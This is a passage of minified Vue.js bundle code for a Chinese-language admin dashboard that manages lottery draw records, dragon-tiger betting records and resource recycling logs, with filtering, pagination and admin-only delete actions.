t=this;this.lotteryDrawRecordListPagination.pageNum=e,this.$nextTick((function(){t.getLotteryDrawRecordList()}))},onShowSizeChangeLotteryDrawRecordListPagination:function(e,t){var i=this;this.lotteryDrawRecordListPagination.pageNum=1,this.lotteryDrawRecordListPagination.pageSize=t,this.$nextTick((function(){i.getLotteryDrawRecordList()}))},getLotteryDrawRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.lotteryDrawRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.lotteryDrawRecordListFilter={lotteryName:void 0,startTimeStamp:void 0,endTimeStamp:void 0},o={pageNum:n,pageSize:r}):(l=Object(A.cloneDeep)(t.lotteryDrawRecordListFilter),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingLotteryDrawRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/lotteryAdminSys/listLotteryDrawRecord",params:o});case 6:c=i.sent,t.loadingLotteryDrawRecordListTable=!1,200===c.status&&(t.lotteryDrawRecordListPagination.total=c.data.count,t.lotteryDrawRecordListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingLotteryDrawRecordListTable=!1;case 15:t.selectedRowKeys=[];case 16:case"end":return i.stop()}}),i,null,[[3,11]])})))()},drawLottery:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.drawLoading=!0,t.next=4,f({method:"POST",url:"/lotteryAdminSys/drawLottery"});case 4:i=t.sent,e.drawLoading=!1,200===i.status&&(e.$message.success("操作成功，请稍后查看结果"),e.getLotteryDrawRecordList()),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 13:case"end":return t.stop()}}),t,null,[[0,9]])})))()}}},Sa={name:"Lottery",components:{Record:xa,DrawRecord:Object(S.a)(ba,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"thunderbolt",type:"primary",loading:e.drawLoading},on:{click:e.drawLottery}},[e._v("手动运行抽奖")]):e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLotteryDrawRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLotteryDrawRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("彩票名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.lotteryDrawRecordListFilter.lotteryName,callback:function(t){e.$set(e.lotteryDrawRecordListFilter,"lotteryName",t)},expression:"lotteryDrawRecordListFilter.lotteryName"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.lotteryDrawRecordListFilter.startTimeStamp,e.lotteryDrawRecordListFilter.endTimeStamp],allowClear:""},on:{change:function(t){e.$set(e.lotteryDrawRecordListFilter,"startTimeStamp",t[0]),e.$set(e.lotteryDrawRecordListFilter,"endTimeStamp",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.lotteryDrawRecordListColumns,"data-source":e.lotteryDrawRecordListData,expandedRowKeys:e.expandedLotteryDrawRecordIds,"row-key":"id",pagination:!1,loading:e.loadingLotteryDrawRecordListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedLotteryDrawRecordIds.find((function(e){return e===i.id}))&&e.expandedLotteryDrawRecordIds.push(i.id);else{var a=Object.keys(e.expandedLotteryDrawRecordIds).find((function(t){return e.expandedLotteryDrawRecordIds[t]===i.id}));void 0!==a&&e.expandedLotteryDrawRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"lotteryName",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"drawTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("总奖池")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px","font-weight":"bolder",color:"#18900f"}},[e._v("$"+e._s(t.drawInfo.totalAward))]),t.drawInfo.goals&&t.drawInfo.goals.length?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("开奖号码")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},e._l(t.drawInfo.goals,(function(t,a){return i("span",{key:a,staticStyle:{"font-weight":"bolder"},style:{marginLeft:0===a?"0":"10px"}},[e._v(e._s(t))])})),0)]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("中奖信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","min-height":"80px","max-height":"200px","overflow-y":"auto","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},e._l(t.drawInfo.awards,(function(t,a){return i("div",{key:a,staticStyle:{height:"35px","line-height":"35px"}},[i("span",[e._v("用户")]),i("strong",{staticStyle:{color:"#1890ff",cursor:"pointer",margin:"0 3px"},on:{click:function(){return e.$router.push({path:"/user",query:{id:t.userId}})}}},[e._v(" "+e._s(a)+" ")]),"number"==typeof t.point?i("span",[e._v(" 猜中 "),i("strong",{staticStyle:{color:"#18900f",margin:"0 3px"}},[e._v(e._s(t.point))]),e._v(" 个数字，获得奖金 "),i("strong",{staticStyle:{color:"#18900f",margin:"0 3px"}},[e._v("$"+e._s(t.bonus))])]):i("span",[e._v(" 抽中 "),i("strong",{staticStyle:{color:"#18900f",margin:"0 3px"}},[e._v(e._s(t.prizeName))]),e._v(" 奖项，获得奖金 "),i("strong",{staticStyle:{color:"#18900f",margin:"0 3px"}},[e._v("$"+e._s(t.bonus))])])])})),0)],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.lotteryDrawRecordListPagination.pageSize,current:e.lotteryDrawRecordListPagination.pageNum,total:e.lotteryDrawRecordListPagination.total},on:{change:e.onChangeLotteryDrawRecordListPagination,showSizeChange:e.onShowSizeChangeLotteryDrawRecordListPagination}})],1)])])}),[],!1,null,"5a3ee2e2",null).exports},data:function(){return{currentTab:"record"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/lottery",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"record"})}),this.currentTab="record")},methods:{}},wa=Object(S.a)(Sa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"公益彩票"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/lottery",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"record",attrs:{tab:"购买记录"}},["record"===e.currentTab?i("Record"):e._e()],1),i("a-tab-pane",{key:"draw-record",attrs:{tab:"开奖记录"}},["draw-record"===e.currentTab?i("DrawRecord"):e._e()],1)],1)],1)])],1)}),[],!1,null,"7a6af068",null).exports,La={name:"LhdRecord",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,deleteLoading:!1,statusTypeList:[{value:1,label:"龙",color:"gold"},{value:2,label:"虎",color:"orange"},{value:4,label:"豹",color:"pink"},{value:3,label:"和",color:"blue"}],loadingLhdRecordListTable:!1,lhdRecordListFilter:{userId:void 0,userName:void 0,stakeType:void 0,resultType:void 0,timeStampStart:void 0,timeStampEnd:void 0},lhdRecordListColumns:[{title:"购买者昵称",key:"userName",dataIndex:"userName",width:150,align:"center",scopedSlots:{customRender:"userName"}},{title:"押注类型",key:"stakeType",dataIndex:"stakeType",width:100,align:"center",scopedSlots:{customRender:"stakeType"}},{title:"押注金额",key:"stakeAmount",dataIndex:"stakeAmount",width:150,align:"center",scopedSlots:{customRender:"stakeAmount"}},{title:"开奖结果",key:"resultType",dataIndex:"resultType",width:100,align:"center",scopedSlots:{customRender:"resultType"}},{title:"开奖数据",key:"resultData",dataIndex:"resultData",width:150,align:"center",scopedSlots:{customRender:"resultData"}},{title:"返还金额",key:"resultAmount",dataIndex:"resultAmount",width:150,align:"center",scopedSlots:{customRender:"resultAmount"}},{title:"下注时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],lhdRecordListData:[],lhdRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedLhdRecordIds:[],selectedRowKeys:[]}},mounted:function(){this.getLhdRecordList()},methods:{onLhdRecordListCleanFilter:function(){var e=this;this.lhdRecordListPagination.pageNum=1,this.$nextTick((function(){e.getLhdRecordList(!0)}))},onLhdRecordListFilter:function(){var e=this;this.lhdRecordListPagination.pageNum=1,this.$nextTick((function(){e.getLhdRecordList()}))},onChangeLhdRecordListPagination:function(e){var t=this;this.lhdRecordListPagination.pageNum=e,this.$nextTick((function(){t.getLhdRecordList()}))},onShowSizeChangeLhdRecordListPagination:function(e,t){var i=this;this.lhdRecordListPagination.pageNum=1,this.lhdRecordListPagination.pageSize=t,this.$nextTick((function(){i.getLhdRecordList()}))},getLhdRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.lhdRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.lhdRecordListFilter={userId:void 0,userName:void 0,stakeType:void 0,resultType:void 0,timeStampStart:void 0,timeStampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.lhdRecordListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingLhdRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/lhdAdminSys/listLhdRecord",params:o});case 6:c=i.sent,t.loadingLhdRecordListTable=!1,200===c.status&&(t.lhdRecordListPagination.total=c.data.count,t.lhdRecordListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingLhdRecordListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},deleteLhdRecords:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,e.deleteLoading=!0,t.next=5,f({method:"DELETE",url:"/lhdAdminSys/deleteLhds",data:i});case 5:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getLhdRecordList(),t.next=14;break;case 10:t.prev=10,t.t0=t.catch(1),e.deleteLoading=!1,console.error(t.t0);case 14:case"end":return t.stop()}}),t,null,[[1,10]])})))()},cleanLhdRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/lhdAdminSys/cleanLhdRecord"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getLhdRecordList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},ka=Object(S.a)(La,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"比大小记录管理"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空比大小记录吗"},on:{confirm:e.cleanLhdRecord}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空比大小记录日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLhdRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onLhdRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中记录吗"},on:{confirm:function(){return e.deleteLhdRecords()}}},[e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("用户ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.lhdRecordListFilter.userId,callback:function(t){e.$set(e.lhdRecordListFilter,"userId",t)},expression:"lhdRecordListFilter.userId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("商城昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.lhdRecordListFilter.userName,callback:function(t){e.$set(e.lhdRecordListFilter,"userName",t)},expression:"lhdRecordListFilter.userName"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("押注类型:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.lhdRecordListFilter.stakeType,callback:function(t){e.$set(e.lhdRecordListFilter,"stakeType",t)},expression:"lhdRecordListFilter.stakeType"}},[i("a-select-option",{key:1,attrs:{title:"龙"}},[e._v("龙")]),i("a-select-option",{key:2,attrs:{title:"虎"}},[e._v("虎")]),i("a-select-option",{key:4,attrs:{title:"豹"}},[e._v("豹")]),i("a-select-option",{key:3,attrs:{title:"和"}},[e._v("和")])],1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("开奖结果:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.lhdRecordListFilter.resultType,callback:function(t){e.$set(e.lhdRecordListFilter,"resultType",t)},expression:"lhdRecordListFilter.resultType"}},[i("a-select-option",{key:1,attrs:{title:"龙"}},[e._v("龙")]),i("a-select-option",{key:2,attrs:{title:"虎"}},[e._v("虎")]),i("a-select-option",{key:4,attrs:{title:"豹"}},[e._v("豹")]),i("a-select-option",{key:3,attrs:{title:"和"}},[e._v("和")])],1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.lhdRecordListFilter.timestampStart,e.lhdRecordListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.lhdRecordListFilter,"timestampStart",t[0]),e.$set(e.lhdRecordListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.lhdRecordListColumns,"data-source":e.lhdRecordListData,expandedRowKeys:e.expandedLhdRecordIds,"row-key":"id",pagination:!1,loading:e.loadingLhdRecordListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedLhdRecordIds.find((function(e){return e===i.id}))&&e.expandedLhdRecordIds.push(i.id);else{var a=Object.keys(e.expandedLhdRecordIds).find((function(t){return e.expandedLhdRecordIds[t]===i.id}));void 0!==a&&e.expandedLhdRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"userName",fn:function(t,a){return[a.user?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.user.userName}})}}},[e._v(e._s(a.user?a.user.userName:a.userId))])]:i("span",[e._v(" - ")])]}},{key:"stakeType",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.statusTypeList.find((function(e){return e.value===a.stakeType}))?e.statusTypeList.find((function(e){return e.value===a.stakeType})).color:"grey"}},[e._v(" "+e._s(void 0!==e.statusTypeList.find((function(e){return e.value===a.stakeType}))?e.statusTypeList.find((function(e){return e.value===a.stakeType})).label:a.stakeType)+" ")])]}},{key:"stakeAmount",fn:function(t){return[i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t))])]}},{key:"resultType",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.statusTypeList.find((function(e){return e.value===a.resultType}))?e.statusTypeList.find((function(e){return e.value===a.resultType})).color:"grey"}},[e._v(" "+e._s(void 0!==e.statusTypeList.find((function(e){return e.value===a.resultType}))?e.statusTypeList.find((function(e){return e.value===a.resultType})).label:a.resultType)+" ")])]}},{key:"resultData",fn:function(t,a){return[i("span",[e._v("龙: "),i("strong",{staticStyle:{color:"#18900f"}},[e._v(e._s(a.resultData&&a.resultData.dragon?a.resultData.dragon:"-"))])]),i("span",{staticStyle:{"margin-left":"15px"}},[e._v("虎: "),i("strong",{staticStyle:{color:"#18900f"}},[e._v(e._s(a.resultData&&a.resultData.tiger?a.resultData.tiger:"-"))])]),i("span",{staticStyle:{"margin-left":"15px"}},[e._v("豹: "),i("strong",{staticStyle:{color:"#18900f"}},[e._v(e._s(a.resultData&&a.resultData.leopard?a.resultData.leopard:"-"))])])]}},{key:"resultAmount",fn:function(t){return[i("strong",{staticStyle:{color:"#1890ff"}},[e._v("$"+e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.lhdRecordListPagination.pageSize,current:e.lhdRecordListPagination.pageNum,total:e.lhdRecordListPagination.total},on:{change:e.onChangeLhdRecordListPagination,showSizeChange:e.onShowSizeChangeLhdRecordListPagination}})],1)])],1)}),[],!1,null,"2518094e",null).exports,Ia={name:"ResourceRecycleRecord",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,deleteLoading:!1,loadingResourceRecycleRecordListTable:!1,resourceRecycleRecordListFilter:{userId:void 0,userName:void 0,type:void 0,timeStampStart:void 0,timeStampEnd:void 0},resourceRecycleRecordListColumns:[{title:"购买者昵称",key:"userName",dataIndex:"userName",width:150,align:"center",scopedSlots:{customRender:"userName"}},{title:"回收类型",key:"type",dataIndex:"type",width:150,align:"center",scopedSlots:{customRender:"type"}},{title:"回收次数",key:"count",dataIndex:"count",width:100,align:"center",scopedSlots:{customRender:"count"}},{title:"发生时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],resourceRecycleRecordListData:[],resourceRecycleRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedResourceRecycleRecordIds:[],selectedRowKeys:[]}},mounted:function(){this.getResourceRecycleRecordList()},methods:{onResourceRecycleRecordListCleanFilter:function(){var e=this;this.resourceRecycleRecordListPagination.pageNum=1,this.$nextTick((function(){e.getResourceRecycleRecordList(!0)}))},onResourceRecycleRecordListFilter:function(){var e=this;this.resourceRecycleRecordListPagination.pageNum=1,this.$nextTick((function(){e.getResourceRecycleRecordList()}))},onChangeResourceRecycleRecordListPagination:function(e){var t=this;this.resourceRecycleRecordListPagination.pageNum=e,this.$nextTick((function(){t.getResourceRecycleRecordList()}))},onShowSizeChangeResourceRecycleRecordListPagination:function(e,t){var i=this;this.resourceRecycleRecordListPagination.pageNum=1,this.resourceRecycleRecordListPagination.pageSize=t,this.$nextTick((function(){i.getResourceRecycleRecordList()}))},getResourceRecycleRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.resourceRecycleRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.resourceRecycleRecordListFilter={userId:void 0,userName:void 0,type:void 0,timeStampStart:void 0,timeStampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.resourceRecycleRecordListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingResourceRecycleRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/resourceRecycleAdminSys/listResourceRecycleRecord",params:o});case 6:c=i.sent,t.loadingResourceRecycleRecordListTable=!1,200===c.status&&(t.resourceRecycleRecordListPagination.total=c.data.count,t.resourceRecycleRecordListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingResourceRecycleRecordListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},deleteResourceRecycleRecords:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,e.deleteLoading=!0,t.next=5,f({method:"DELETE",url:"/resourceRecycleAdminSys/deleteResourceRecycles",data:i});case 5:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getResourceRecycleRecordList(),t.next=14;break;case 10:t.prev=10,t.t0=t.catch(1),e.deleteLoading=!1,console.error(t.t0);case 14:case"end":return t.stop()}}),t,null,[[1,10]])})))()},cleanResourceRecycleRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/resourceRecycleAdminSys/cleanResourceRecycleRecord"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getResourceRecycleRecordList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},_a=Object(S.a)(Ia,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"物资回收记录管理"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空物资回收记录吗"},on:{confirm:e.cleanResourceRecycleRecord}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空物资回收记录日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onResourceRecycleRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onResourceRecycleRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中记录吗"},on:{confirm:function(){return 